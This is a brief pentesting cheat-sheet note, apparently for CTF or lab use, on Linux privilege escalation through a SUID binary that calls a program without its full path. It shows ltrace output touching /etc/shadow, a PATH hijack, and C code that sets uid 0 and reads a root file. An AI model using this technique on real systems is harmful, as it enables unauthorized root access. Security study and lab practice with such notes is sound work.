# Unsanitized Path
#unsanitizedpath 

1. Search for suid binaries (see [[LPE]])
2. Check if binary calls other binaries without full path via `ltrace` and `strace`
```
XXXXXXXXXX:~$ ltrace ./backup 
__libc_start_main(0x804841d, 1, 0xbffff7d4, 0x8048440 <unfinished ...>
system("cat /etc/shadow"cat: /etc/shadow: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
```
3.  Add local path (`pwd`) to the start of the the `$PATH` var
`export PATH=<pwd-output>:$PATH`
5.  Place a evil bin with the name of the unsanitized bin in the current folder, for example:
demo.c:
```
#include<unistd.h>
void main(){
        setuid(0);
        setgid(0);
        system("more /root/root.txt");
}
```
`gcc demo.c -o <name-of-evil-bin>`
But any executable file can be used.
6. Run the vulnerable binary
7. `$$$`